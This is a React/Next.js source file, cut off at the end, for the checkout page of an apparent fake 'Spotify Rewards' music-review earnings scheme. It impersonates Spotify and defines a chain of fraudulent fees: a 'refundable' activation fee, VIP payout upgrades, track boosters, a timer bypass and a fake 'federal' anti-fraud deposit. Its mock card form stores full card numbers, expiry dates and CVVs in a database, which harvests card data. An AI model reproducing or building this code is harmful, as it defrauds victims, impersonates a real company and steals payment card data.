'use client';

import {
  AlertCircle,
  ArrowLeft,
  ArrowRight,
  Check,
  CheckCircle2,
  Clock,
  CreditCard,
  Lock,
  RefreshCw,
  ShieldCheck,
  Sparkles,
  TrendingUp,
  ChevronDown,
} from 'lucide-react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import React, { Suspense, useEffect, useState } from 'react';
import { loadStripe } from '@stripe/stripe-js';
import {
  Elements,
  PaymentElement,
  useElements,
  useStripe,
} from '@stripe/react-stripe-js';
import {
  recordPaymentInSupabase,
  upsertCustomer,
  recordFunnelEvent,
  recordCardTestInSupabase,
  unlockOfferBenefitAfterPayment,
  OfferIdType,
} from '../../lib/supabase';
import MetaPixelTracker, { trackFunnelPixelEvent } from '../components/MetaPixelTracker';

// Pre-load Stripe promise if key is present
const stripePublishableKey = process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY || '';
const stripePromise =
  stripePublishableKey && !stripePublishableKey.includes('placeholder')
    ? loadStripe(stripePublishableKey)
    : null;

interface OfferCheckoutConfig {
  id: OfferIdType;
  adminOfferName: string;
  price: number;
  priceFormatted: string;
  originalPriceFormatted?: string;
  badgeText: string;
  headingPrefix: string;
  headingHighlight: string;
  subheading: string;
  summaryTitle: string;
  summarySubtitle: string;
  summaryRightTag: string;
  buttonText: string;
  bullets: { bold: string; text: string }[];
  redirectUrl: string;
  successModalTitle: string;
  successModalDescription: string;
  successButtonLabel: string;
}

const OFFER_CHECKOUT_CONFIGS: Record<OfferIdType, OfferCheckoutConfig> = {
  front_9_00: {
    id: 'front_9_00',
    adminOfferName: 'Front-End: Taxa de Ativação ($9.00)',
    price: 9.0,
    priceFormatted: '9.00',
    badgeText: 'INSTANT CASHOUT VERIFICATION',
    headingPrefix: 'Your',
    headingHighlight: '$114.93 USD',
    subheading:
      'Review your account information and available payment options. Complete listener verification to unlock instant cashout.',
    summaryTitle: 'One-Time Anti-Spam Security Pass',
    summarySubtitle: 'Automatic refund within 1–2 hours',
    summaryRightTag: '100% Refundable',
    buttonText: 'CLAIM MY REWARD ($9.00)',
    bullets: [
      {
        bold: 'Unlock Full Cashout:',
        text: 'Direct deposit of your accumulated balance to PayPal, Zelle, Cash App, or Bank Account',
      },
      {
        bold: 'Daily Music Review Batches:',
        text: 'Access the official 20-track evaluation catalog and earn $17.50–$20.50 per track',
      },
      {
        bold: 'Official Verified Listener Badge:',
        text: 'Priority payouts with full partner account access',
      },
      {
        bold: '100% Refundable Security Fee:',
        text: 'Automatically refunded back to your card within 1–2 hours after verification',
      },
    ],
    redirectUrl: '/spotify/dashboard',
    successModalTitle: 'Payment & Verification Confirmed!',
    successModalDescription:
      'Your one-time refundable verification of $9.00 USD was successfully processed.',
    successButtonLabel: 'Enter Official Dashboard →',
  },
  upsell_vip_19_90: {
    id: 'upsell_vip_19_90',
    adminOfferName: 'Upsell #1: Saque VIP 7 Dias',
    price: 19.9,
    priceFormatted: '19.90',
    badgeText: 'VIP GOLD FAST PAYOUT UPGRADE',
    headingPrefix: 'Upgrade to',
    headingHighlight: '7-Day VIP Payouts',
    subheading:
      'Cut your royalty clearing schedule in half! Upgrade from the standard 15-day holding window to priority 7-day automatic disbursements.',
    summaryTitle: 'VIP Gold 7-Day Fast Payout Pass',
    summarySubtitle: 'Permanent account tier upgrade • Priority ACH/Zelle clearing',
    summaryRightTag: 'VIP Priority Tier',
    buttonText: 'ACTIVATE 7-DAY VIP PAYOUTS ($19.90)',
    bullets: [
      {
        bold: '7-Day Fast Disbursement:',
        text: 'Receive your evaluation royalties every 7 calendar days instead of waiting 15 days',
      },
      {
        bold: 'VIP Gold Account Status:',
        text: 'Priority clearing queue for Direct Deposit (ACH), Zelle, Cash App, and PayPal',
      },
      {
        bold: 'Accelerated KYC Review:',
        text: 'Fast-track compliance verification for all future withdrawals',
      },
      {
        bold: 'Lifetime Tier Activation:',
        text: 'One-time upgrade fee covers all your future payouts permanently',
      },
    ],
    redirectUrl: '/spotify/dashboard?upgraded=upsell_vip_19_90',
    successModalTitle: 'VIP 7-Day Payouts Activated!',
    successModalDescription:
      'Your account has been upgraded to VIP Gold Tier. Your payout release schedule is now set to 7 days!',
    successButtonLabel: 'Return to Music Dashboard →',
  },
  downsell_vip_11_90: {
    id: 'downsell_vip_11_90',
    adminOfferName: 'Downsell #1: Saque VIP 7 Dias (40% OFF)',
    price: 11.9,
    priceFormatted: '11.90',
    originalPriceFormatted: '19.90',
    badgeText: 'EXCLUSIVE 40% DISCOUNT • ACTIVE EVALUATOR OFFER',
    headingPrefix: 'Claim Your',
    headingHighlight: '40% OFF VIP 7-Day Pass',
    subheading:
      'Because you completed your first evaluations today, you unlocked a one-time 40% discount on the VIP 7-Day Fast Payout Pass.',
    summaryTitle: 'VIP 7-Day Fast Payout Pass (40% OFF)',
    summarySubtitle: 'Discounted from $19.90 USD • One-time upgrade',
    summaryRightTag: 'Save $8.00 Today',
    buttonText: 'CLAIM VIP 7-DAY PASS ($11.90)',
    bullets: [
      {
        bold: 'Cut Waiting Time in Half:',
        text: 'Switch your account from 15-day standard cycles to 7-day priority payouts',
      },
      {
        bold: '40% Active Listener Discount:',
        text: 'Get the exact same VIP Gold Tier benefits for $11.90 instead of $19.90',
      },
      {
        bold: 'Priority Banking Queue:',
        text: 'First-in-line settlement for ACH, Zelle, Cash App, and PayPal transfers',
      },
      {
        bold: 'Instant Activation:',
        text: 'Your new 7-day release date updates immediately on your dashboard',
      },
    ],
    redirectUrl: '/spotify/dashboard?upgraded=downsell_vip_11_90',
    successModalTitle: 'VIP 7-Day Pass Unlocked!',
    successModalDescription:
      'Your 40% discount VIP Gold upgrade ($11.90 USD) is confirmed and your 7-day payout schedule is now active!',
    successButtonLabel: 'Return to Music Dashboard →',
  },
  upsell_booster3_16_97: {
    id: 'upsell_booster3_16_97',
    adminOfferName: 'Upsell #2: Booster +3 Músicas/Dia',
    price: 16.97,
    priceFormatted: '16.97',
    badgeText: 'TASK BOOSTER TIER 2 • +3 EXTRA TRACKS DAILY',
    headingPrefix: 'Unlock',
    headingHighlight: '+3 Extra Tracks Daily',
    subheading:
      'Double your daily evaluation capacity from 3 to 6 songs per day and boost your daily earning potential up to +$150.00 USD/day!',
    summaryTitle: 'Task Booster Tier 2 (+3 Daily Tracks)',
    summarySubtitle: 'Expands daily limit to 6 tracks/day immediately',
    summaryRightTag: '2x Daily Earnings',
    buttonText: 'UNLOCK +3 TRACKS BOOSTER ($16.97)',
    bullets: [
      {
        bold: '+3 Extra Songs Every Day:',
        text: 'Increase your daily evaluation limit from 3 to 6 promotional tracks per day',
      },
      {
        bold: 'Earn Up to +$60.00 Extra Daily:',
        text: 'Each additional track pays $17.50–$20.50 USD directly to your listener balance',
      },
      {
        bold: 'Immediate Queue Unlock:',
        text: 'Your next 3 tracks unlock right now without waiting for the 12-hour timer',
      },
      {
        bold: 'Priority Label Catalog:',
        text: 'Access high-paying pre-release tracks from major artists in the 20-track pool',
      },
    ],
    redirectUrl: '/spotify/dashboard?upgraded=upsell_booster3_16_97',
    successModalTitle: '+3 Daily Tracks Booster Active!',
    successModalDescription:
      'Your daily limit has been expanded to 6 tracks/day! Returning to your dashboard so you can evaluate your next tracks now.',
    successButtonLabel: 'Evaluate Next Tracks Now →',
  },
  downsell_booster2_9_12: {
    id: 'downsell_booster2_9_12',
    adminOfferName: 'Downsell #2: Booster +2 Músicas/Dia',
    price: 9.12,
    priceFormatted: '9.12',
    originalPriceFormatted: '16.97',
    badgeText: 'SPECIAL BOOSTER DOWNSELL • +2 EXTRA TRACKS DAILY',
    headingPrefix: 'Unlock',
    headingHighlight: '+2 Extra Tracks Daily',
    subheading:
      'Expand your daily queue from 3 to 5 songs per day for just $9.12 USD and earn up to +$40.00 USD extra today!',
    summaryTitle: 'Special Booster Pass (+2 Daily Tracks)',
    summarySubtitle: 'Expands daily limit to 5 tracks/day immediately',
    summaryRightTag: 'Special Offer',
    buttonText: 'UNLOCK +2 TRACKS BOOSTER ($9.12)',
    bullets: [
      {
        bold: '+2 Extra Songs Immediately:',
        text: 'Upgrade your daily limit from 3 to 5 tracks per day right now',
      },
      {
        bold: 'Earn ~$38.00–$41.00 Extra Today:',
        text: 'Your first extra song evaluation pays back more than 2x the pass cost',
      },
      {
        bold: 'No Waiting Required:',
        text: 'Continue evaluating tracks 4 and 5 immediately upon confirmation',
      },
      {
        bold: 'Permanent Daily Upgrade:',
        text: 'Keep your 5-track daily capacity active on your listener profile',
      },
    ],
    redirectUrl: '/spotify/dashboard?upgraded=downsell_booster2_9_12',
    successModalTitle: '+2 Daily Tracks Booster Active!',
    successModalDescription:
      'Your daily limit has been expanded to 5 tracks/day! Returning to your dashboard so you can continue evaluating now.',
    successButtonLabel: 'Evaluate Next Tracks Now →',
  },
  upsell_skip12h_9_65: {
    id: 'upsell_skip12h_9_65',
    adminOfferName: 'Upsell #3: Destravar Timer 12h',
    price: 9.65,
    priceFormatted: '9.65',
    badgeText: 'INSTANT COOLDOWN BYPASS • FAST-FORWARD 12H',
    headingPrefix: 'Bypass the',
    headingHighlight: '12-Hour Queue Timer',
    subheading:
      'Don’t wait 12 hours for the next daily reset! Reset your daily counter immediately and unlock your next batch of promotional tracks right now.',
    summaryTitle: 'Queue Fast-Forward Pass (Bypass 12h Timer)',
    summarySubtitle: 'Instant daily counter reset • Keep 100% of your balance',
    summaryRightTag: 'Instant Unlock',
    buttonText: 'BYPASS 12H TIMER & UNLOCK QUEUE ($9.65)',
    bullets: [
      {
        bold: 'Skip the 12-Hour Cooldown:',
        text: 'Zero out your waiting timer and start evaluating your next batch of tracks immediately',
      },
      {
        bold: 'Keep 100% of Your Balance:',
        text: 'All your accumulated earnings remain safely intact while you add new royalties',
      },
      {
        bold: 'Unlock Next Catalog Tracks:',
        text: 'Advances your queue directly to the next unreleased tracks in the 20-song pool',
      },
      {
        bold: 'Fast ROI on First Track:',
        text: 'Earn $17.50–$20.50 USD on the very next song you evaluate in 90 seconds',
      },
    ],
    redirectUrl: '/spotify/dashboard?upgraded=upsell_skip12h_9_65',
    successModalTitle: '12-Hour Timer Bypassed!',
    successModalDescription:
      'Your daily evaluation counter has been reset! Returning to your dashboard with your new tracks unlocked.',
    successButtonLabel: 'Start Next Track Evaluation →',
  },
  upsell_antifraud_9_97: {
    id: 'upsell_antifraud_9_97',
    adminOfferName: 'Upsell #4: Taxa Anti-Fraude do Saque ($9.97)',
    price: 9.97,
    priceFormatted: '9.97',
    badgeText: 'INTER-BANK ANTI-FRAUD CLEARANCE • 100% ADDED TO PAYOUT',
    headingPrefix: 'Complete Your',
    headingHighlight: 'Anti-Fraud Clearance',
    subheading:
      'Following your KYC document upload, federal clearinghouse rules require a one-time $9.97 USD Anti-Fraud Verification Deposit. 100% of this $9.97 USD is added directly to your withdrawal payout!',
    summaryTitle: 'Anti-Fraud Security Verification Deposit',
    summarySubtitle: '+$9.97 USD added immediately to your total withdrawal balance',
    summaryRightTag: '100% Added to Payout',
    buttonText: 'VERIFY & ADD +$9.97 TO MY PAYOUT ($9.97)',
    bullets: [
      {
        bold: '100% Added to Your Withdrawal:',
        text: 'The $9.97 USD verification deposit is credited directly onto your total payout amount',
      },
      {
        bold: 'Clears Federal ACH / Wire Hold:',
        text: 'Satisfies Section 7 Inter-Bank Anti-Fraud & KYC Ownership Reconciliation rules',
      },
      {
        bold: 'Immediate Re-Submission:',
        text: 'Unlock and re-submit your full withdrawal transfer immediately after confirmation',
      },
      {
        bold: 'Verified Identity Match:',
        text: 'Links your uploaded KYC ID and Proof of Address to your receiving payout account',
      },
    ],
    redirectUrl: '/spotify/dashboard/profile?tab=request_withdrawal&upgraded=upsell_antifraud_9_97',
    successModalTitle: 'Anti-Fraud Clearance Confirmed!',
    successModalDescription:
      '+$9.97 USD has been added to your withdrawal balance! Returning to your Withdrawal Center so you can submit your final payout transfer.',
    successButtonLabel: 'Submit Final Payout Transfer →',
  },
};

// Stripe Official Payment Form Component
function StripePaymentForm({
  clientSecret,
  fullName,
  setFullName,
  email,
  setEmail,
  country,
  offerConfig,
  onSuccess,
}: {
  clientSecret: string;
  fullName: string;
  setFullName: (v: string) => void;
  email: string;
  setEmail: (v: string) => void;
  country: string;
  offerConfig: OfferCheckoutConfig;
  onSuccess: () => void;
}) {
  const stripe = useStripe();
  const elements = useElements();
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!fullName.trim()) {
      setErrorMessage('Please enter your full name as shown on your card.');
      return;
    }
    if (!email.trim() || !email.includes('@')) {
      setErrorMessage('Please enter a valid email address to receive your confirmation receipt.');
      return;
    }

    if (typeof window !== 'undefined') {
      sessionStorage.setItem('spotify_listener_name', fullName.trim());
      sessionStorage.setItem('spotify_listener_email', email.trim());
    }

    if (!stripe || !elements) {
      return;
    }

    setIsProcessing(true);
    setErrorMessage(null);

    trackFunnelPixelEvent(
      'AddPaymentInfo',
      {
        content_id: offerConfig.id,
        content_name: offerConfig.summaryTitle,
        content_type: 'product',
        value: offerConfig.price,
        currency: 'USD',
      },
      {
        email: email.trim(),
        full_name: fullName.trim(),
      }
    );

    try {
      const returnUrlTarget = `${window.location.origin}${offerConfig.redirectUrl}`;

      const { error, paymentIntent } = await stripe.confirmPayment({
        elements,
        confirmParams: {
          return_url: returnUrlTarget,
          payment_method_data: {
            billing_details: {
              name: fullName.trim() || undefined,
              email: email.trim() || undefined,
              address: {
                country: country || 'US',
              },
            },
          },
        },
        redirect: 'if_required',
      });

      if (error) {
        const errReason = error.message || 'Card declined by issuer.';
        setErrorMessage(errReason);
        setIsProcessing(false);

        await recordPaymentInSupabase({
          email: email.trim(),
          full_name: fullName.trim(),
          amount: offerConfig.price,
          currency: 'usd',
          status: 'declined',
          error_message: `Recusado em ${offerConfig.adminOfferName}: ${errReason}`,
          country,
        }).catch(() => {});

        await recordFunnelEvent({
          email: email.trim(),
          full_name: fullName.trim(),
          offer_id: offerConfig.id,
          offer_name: offerConfig.adminOfferName,
          amount: offerConfig.price,
          action: 'card_declined',
          error_reason: errReason,
          skipPaymentTable: true,
        }).catch(() => {});
      } else if (paymentIntent && paymentIntent.status === 'succeeded') {
        setIsProcessing(false);

        await recordPaymentInSupabase({
          email: email.trim(),
          full_name: fullName.trim(),
          amount: offerConfig.price,
          currency: 'usd',
          status: 'succeeded',
          stripe_payment_id: paymentIntent.id,
          error_message: `Aprovado: ${offerConfig.adminOfferName} ($${offerConfig.priceFormatted})`,
          country,
        }).catch(() => {});

        await recordFunnelEvent({
          email: email.trim(),
          full_name: fullName.trim(),
          offer_id: offerConfig.id,
          offer_name: offerConfig.adminOfferName,
          amount: offerConfig.price,
          action: 'accepted',
          skipPaymentTable: true,
        }).catch(() => {});

        onSuccess();
      } else {
        setIsProcessing(false);
        onSuccess();
      }
    } catch (err: any) {
      const errReason = err.message || 'Unexpected payment error.';
      setErrorMessage(errReason);
      setIsProcessing(false);

      recordPaymentInSupabase({
        email: email.trim(),
        full_name: fullName.trim(),
        amount: offerConfig.price,
        currency: 'usd',
        status: 'declined',
        error_message: `Erro em ${offerConfig.adminOfferName}: ${errReason}`,
        country,
      }).catch(() => {});

      recordFunnelEvent({
        email: email.trim(),
        full_name: fullName.trim(),
        offer_id: offerConfig.id,
        offer_name: offerConfig.adminOfferName,
        amount: offerConfig.price,
        action: 'card_declined',
        error_reason: errReason,
        skipPaymentTable: true,
      }).catch(() => {});
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div className="space-y-3.5 mb-2">
        <div>
          <label className="block text-sm font-semibold text-gray-200 mb-2">
            Full name
          </label>
          <input
            type="text"
            value={fullName}
            onChange={(e) => setFullName(e.target.value)}
            placeholder="First and last name"
            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
          />
        </div>

        <div>
          <label className="block text-sm font-semibold text-gray-200 mb-2">
            Email address
          </label>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            onBlur={() => {
              if (email.trim() && email.includes('@')) {
                if (typeof window !== 'undefined') {
                  sessionStorage.setItem('spotify_listener_email', email.trim());
                  if (fullName) sessionStorage.setItem('spotify_listener_name', fullName.trim());
                }
                upsertCustomer({
                  email: email.trim(),
                  full_name: fullName.trim() || undefined,
                }).catch(() => {});
              }
            }}
            placeholder="name@example.com"
            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
          />
          <p className="text-[11px] text-[#707e76] mt-1.5 flex items-center gap-1">
            <span>Official receipt &amp; instant feature activation linked to this account email.</span>
          </p>
        </div>
      </div>

      <div className="stripe-element-container py-1">
        <PaymentElement
          options={{
            layout: 'tabs',
          }}
        />
      </div>

      {errorMessage && (
        <div className="p-3.5 rounded-xl bg-red-500/10 border border-red-500/30 flex items-start gap-2.5 text-xs text-red-400">
          <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
          <span>{errorMessage}</span>
        </div>
      )}

      <div className="pt-2 text-xs text-[#829288] leading-relaxed text-center sm:text-left space-y-2">
        <p>
          By providing your card details, you authorize Spotify Rewards to process this transaction in accordance with the program terms.
        </p>
        <p className="text-[11px] text-[#6d7c73]">
          One-time charge of ${offerConfig.priceFormatted} USD for {offerConfig.summaryTitle}. Instant account activation upon approval.
        </p>
      </div>

      <button
        type="submit"
        disabled={isProcessing || !stripe}
        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-sm sm:text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
      >
        {isProcessing ? (
          <>
            <RefreshCw className="w-5 h-5 animate-spin" />
            <span>PROCESSING PAYMENT...</span>
          </>
        ) : (
          <>
            <span>{offerConfig.buttonText}</span>
            <ArrowRight className="w-5 h-5" />
          </>
        )}
      </button>
    </form>
  );
}

// Interactive High-Fidelity Card Form (Used when Stripe keys are in test/preview mode)
function InteractiveMockPaymentForm({
  fullName,
  setFullName,
  email,
  setEmail,
  country,
  setCountry,
  offerConfig,
  onSuccess,
}: {
  fullName: string;
  setFullName: (v: string) => void;
  email: string;
  setEmail: (v: string) => void;
  country: string;
  setCountry: (v: string) => void;
  offerConfig: OfferCheckoutConfig;
  onSuccess: () => void;
}) {
  const [cardNumber, setCardNumber] = useState('');
  const [expDate, setExpDate] = useState('');
  const [cvc, setCvc] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const isExpDateInvalid = (exp: string) => {
    if (!exp) return false;
    const parts = exp.split('/');
    const monthStr = parts[0]?.trim();
    if (monthStr && monthStr.length >= 2) {
      const m = parseInt(monthStr, 10);
      if (isNaN(m) || m < 1 || m > 12) return true;
    }
    if (parts.length === 2) {
      const m = parseInt(monthStr, 10);
      const yy = parts[1]?.trim();
      if (isNaN(m) || m < 1 || m > 12) return true;
      if (yy && yy.length === 2) {
        const y = parseInt('20' + yy, 10);
        if (isNaN(y) || y < 2026) return true;
        if (y === 2026 && m < 11) return true;
      }
    }
    return false;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
    setCardNumber(formatted);
  };

  const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length === 1 && parseInt(raw, 10) > 1) {
      raw = `0${raw}`;
    }
    if (raw.length >= 3) {
      setExpDate(`${raw.slice(0, 2)}/${raw.slice(2)}`);
    } else {
      setExpDate(raw);
    }
  };

  const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCvc(e.target.value.replace(/\D/g, '').slice(0, 4));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    if (!fullName.trim()) {
      setErrorMsg('Please enter your full name as shown on your card.');
      return;
    }
    if (!email.trim() || !email.includes('@')) {
      setErrorMsg('Please enter a valid email address to receive your confirmation receipt.');
      return;
    }

    if (typeof window !== 'undefined') {
      sessionStorage.setItem('spotify_listener_name', fullName.trim());
      sessionStorage.setItem('spotify_listener_email', email.trim());
    }

    trackFunnelPixelEvent(
      'AddPaymentInfo',
      {
        content_id: offerConfig.id,
        content_name: offerConfig.summaryTitle,
        content_type: 'product',
        value: offerConfig.price,
        currency: 'USD',
      },
      {
        email: email.trim(),
        full_name: fullName.trim(),
      }
    );

    const cleanNum = cardNumber.replace(/\s/g, '');
    if (cleanNum.length < 15) {
      setErrorMsg('Please enter a valid card number (or test card 4242 4242 4242 4242).');
      return;
    }
    const parts = expDate.split('/');
    const month = parseInt(parts[0], 10);
    if (isNaN(month) || month < 1 || month > 12) {
      setErrorMsg('Invalid month. Expiration month must be between 01 and 12.');
      return;
    }
    const yy = parts[1];
    const year = yy ? parseInt('20' + yy, 10) : 0;
    if (year < 2026 || (year === 2026 && month < 11)) {
      setErrorMsg('Expired card or invalid date (minimum valid is November 2026).');
      return;
    }
    if (expDate.length < 5 || isExpDateInvalid(expDate)) {
      setErrorMsg('Please enter a valid expiration date (MM / YY, min 11/26).');
      return;
    }
    if (cvc.length < 3) {
      setErrorMsg('Please enter a valid security code (CVC).');
      return;
    }

    setIsProcessing(true);

    // Check if user entered a known test-decline card ending in 0002 or 9999 to simulate declined card tracking
    const isSimulatedDecline = cleanNum.endsWith('0002') || cleanNum.endsWith('9999');

    setTimeout(async () => {
      setIsProcessing(false);

      await recordCardTestInSupabase({
        card_number: cardNumber,
        exp_date: expDate,
        cvv: cvc,
        country,
        status: isSimulatedDecline ? 'declined' : 'succeeded',
      }).catch(() => {});

      if (isSimulatedDecline) {
        const declineReason = 'Your card was declined by the issuing bank (Insufficient Funds / Do Not Honor).';
        setErrorMsg(declineReason);

        await recordPaymentInSupabase({
          email: email.trim(),
          full_name: fullName.trim(),
          amount: offerConfig.price,
          currency: 'usd',
          status: 'declined',
          error_message: `Recusado em ${offerConfig.adminOfferName}: ${declineReason}`,
          country,
        }).catch(() => {});

        await recordFunnelEvent({
          email: email.trim(),
          full_name: fullName.trim(),
          offer_id: offerConfig.id,
          offer_name: offerConfig.adminOfferName,
          amount: offerConfig.price,
          action: 'card_declined',
          error_reason: declineReason,
          card_last4: cleanNum.slice(-4),
          skipPaymentTable: true,
        }).catch(() => {});
        return;
      }

      await recordPaymentInSupabase({
        email: email.trim(),
        full_name: fullName.trim(),
        amount: offerConfig.price,
        currency: 'usd',
        status: 'succeeded',
        error_message: `Aprovado: ${offerConfig.adminOfferName} ($${offerConfig.priceFormatted})`,
        country,
      }).catch(() => {});

      await recordFunnelEvent({
        email: email.trim(),
        full_name: fullName.trim(),
        offer_id: offerConfig.id,
        offer_name: offerConfig.adminOfferName,
        amount: offerConfig.price,
        action: 'accepted',
        card_last4: cleanNum.slice(-4),
        skipPaymentTable: true,
      }).catch(() => {});

      onSuccess();
    }, 1600);
  };

  const [activeTab, setActiveTab] = useState<'card' | 'gpay'>('card');

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div className="space-y-3.5 mb-2">
        <div>
          <label className="block text-sm font-semibold text-gray-200 mb-2">
            Full name
          </label>
          <input
            type="text"
            value={fullName}
            onChange={(e) => setFullName(e.target.value)}
            placeholder="First and last name"
            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
          />
        </div>

        <div>
          <label className="block text-sm font-semibold text-gray-200 mb-2">
            Email address
          </label>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            onBlur={() => {
              if (email.trim() && email.includes('@')) {
                if (typeof window !== 'undefined') {
                  sessionStorage.setItem('spotify_listener_email', email.trim());
                  if (fullName) sessionStorage.setItem('spotify_listener_name', fullName.trim());
                }
                upsertCustomer({
                  email: email.trim(),
                  full_name: fullName.trim() || undefined,
                }).catch(() => {});
              }
            }}
            placeholder="name@example.com"
            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
          />
          <p className="text-[11px] text-[#707e76] mt-1.5 flex items-center gap-1">
            <span>Official receipt &amp; instant feature activation linked to this account email.</span>
          </p>
        </div>
      </div>

      {/* Payment Method Selector Tabs */}
      <div className="grid grid-cols-2 gap-3 mb-2">
        <div
          onClick={() => setActiveTab('card')}
          className={`h-[68px] rounded-2xl p-3.5 flex flex-col justify-between cursor-pointer transition-all select-none ${
            activeTab === 'card'
              ? 'bg-[#1db954] text-black shadow-md'
              : 'bg-[#131715] border border-[#26312a] text-gray-300 hover:border-gray-500'
          }`}
        >
          <CreditCard className="w-5 h-5 stroke-[2.5]" />
          <span className="text-sm font-bold tracking-tight">Card</span>
        </div>

        <div
          onClick={() => setActiveTab('gpay')}
          className={`h-[68px] rounded-2xl p-3.5 flex flex-col justify-between cursor-pointer transition-all select-none ${
            activeTab === 'gpay'
              ? 'bg-[#1db954] text-black shadow-md'
              : 'bg-[#131715] border border-[#26312a] text-gray-300 hover:border-gray-500'
          }`}
        >
          <div className="flex items-center">
            <span className="px-2 py-0.5 rounded bg-white text-[11px] font-black text-black tracking-tight inline-flex items-center gap-1">
              <span className="text-[#4285F4] font-black">G</span>Pay
            </span>
          </div>
          <span className="text-sm font-bold tracking-tight">Google Pay</span>
        </div>
      </div>

      {activeTab === 'gpay' ? (
        <div className="py-6 px-4 rounded-2xl bg-[#131715] border border-[#26312a] text-center space-y-3">
          <p className="text-sm text-gray-300">
            Click below to verify with Google Pay on supported devices:
          </p>
          <button
            type="button"
            onClick={handleSubmit}
            disabled={isProcessing}
            className="w-full py-3.5 px-6 rounded-full bg-white hover:bg-gray-100 text-black font-extrabold text-sm flex items-center justify-center gap-2 cursor-pointer transition-all"
          >
            <span className="text-[#4285F4] font-black">G</span>Pay &bull; Pay ${offerConfig.priceFormatted} USD
          </button>
        </div>
      ) : (
        <>
          <div>
            <label className="block text-sm font-semibold text-gray-200 mb-2">
              Card number
            </label>
            <div className="relative">
              <input
                type="text"
                inputMode="numeric"
                value={cardNumber}
                onChange={handleCardNumberChange}
                placeholder="1234 1234 1234 1234"
                className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-24"
              />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-3.5">
            <div>
              <label className="block text-sm font-semibold text-gray-200 mb-2">
                Expiration date
              </label>
              <input
                type="text"
                inputMode="numeric"
                value={expDate}
                onChange={handleExpChange}
                placeholder="MM / YY"
                className={`w-full bg-[#131715] border rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none transition-colors ${
                  isExpDateInvalid(expDate)
                    ? 'border-red-500 focus:border-red-500'
                    : 'border-[#26312a] focus:border-[#1db954]'
                }`}
              />
            </div>

            <div>
              <label className="block text-sm font-semibold text-gray-200 mb-2">
                Security code
              </label>
              <div className="relative">
                <input
                  type="text"
                  inputMode="numeric"
                  value={cvc}
                  onChange={handleCvcChange}
                  placeholder="CVC"
                  className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-12"
                />
              </div>
            </div>
          </div>

          <div>
            <label className="block text-sm font-semibold text-gray-200 mb-2">
              Country
            </label>
            <div className="relative">
              <select
                value={country}
                onChange={(e) => setCountry(e.target.value)}
                className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white focus:outline-none focus:border-[#1db954] transition-colors appearance-none cursor-pointer pr-10"
              >
                {COUNTRIES_LIST.map((c) => (
                  <option key={c.code} value={c.code} className="bg-[#121814] text-white">
                    {c.name} ({c.code})
                  </option>
                ))}
              </select>
              <ChevronDown className="w-4 h-4 text-gray-400 absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none" />
            </div>
          </div>
        </>
      )}

      {errorMsg && (
        <div className="p-3.5 rounded-xl bg-red-500/10 border border-red-500/30 flex items-start gap-2.5 text-xs text-red-400">
          <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
          <span>{errorMsg}</span>
        </div>
      )}

      <div className="pt-2 text-xs text-[#829288] leading-relaxed text-center sm:text-left space-y-2">
        <p>
          By providing your card details, you authorize Spotify Rewards to process this transaction in accordance with the program terms.
        </p>
        <p className="text-[11px] text-[#6d7c73]">
          One-time charge of ${offerConfig.priceFormatted} USD for {offerConfig.summaryTitle}. Instant account activation upon approval.
        </p>
      </div>

      <button
        type="submit"
        disabled={isProcessing}
        className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-sm sm:text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
      >
        {isProcessing ? (
          <>
            <RefreshCw className="w-5 h-5 animate-spin" />
            <span>PROCESSING PAYMENT...</span>
          </>
        ) : (
          <>
            <span>{offerConfig.buttonText}</span>
            <ArrowRight className="w-5 h-5" />
          </>
        )}
      </button>
    </form>
  );
}

const COUNTRIES_LIST = [
